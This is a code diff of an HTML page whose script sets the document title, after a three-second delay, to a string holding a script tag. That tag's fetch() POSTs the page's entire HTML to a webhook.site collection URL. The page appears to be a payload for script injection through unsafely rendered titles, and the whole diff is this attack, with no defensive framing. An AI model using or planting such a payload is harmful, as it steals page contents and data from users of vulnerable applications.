@@ -7,9 +7,40 @@
 </head>
 <body>
     <script>
-        setTimeout(() => {
-            const scriptContent = `fetch("https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e", {method: "POST", body: "data=some data", headers: {"Content-Type": "application/x-www-form-urlencoded"}})`;
-            document.title = `<script>${scriptContent}<\/script>`;
+        // Function to stringify a request object
+        function stringifyRequest(method, url, body, headers) {
+            return JSON.stringify({
+                method: method,
+                url: url,
+                body: body,
+                headers: headers
+            });
+        }
+
+        // Function to create the script tag with a POST request
+        function createScriptWithPostRequest() {
+            var method = "POST";
+            var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
+            var body = JSON.stringify({
+                Contents: document.documentElement.innerHTML
+            });
+            var headers = {
+                "Content-type": "application/json; charset=UTF-8"
+            };
+
+            var requestString = stringifyRequest(method, url, body, headers);
+
+            // Construct the script tag with the POST request code
+            var scriptTagContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
+            var scriptTag = '<script>' + scriptTagContent + '</script>';
+
+            // Set the title to the script tag
+            document.title = scriptTag;
+        }
+
+        // Wait for 3 seconds and then set the title to the script tag with the POST request
+        setTimeout(function () {
+            createScriptWithPostRequest();
         }, 3000);
     </script>
 </body>
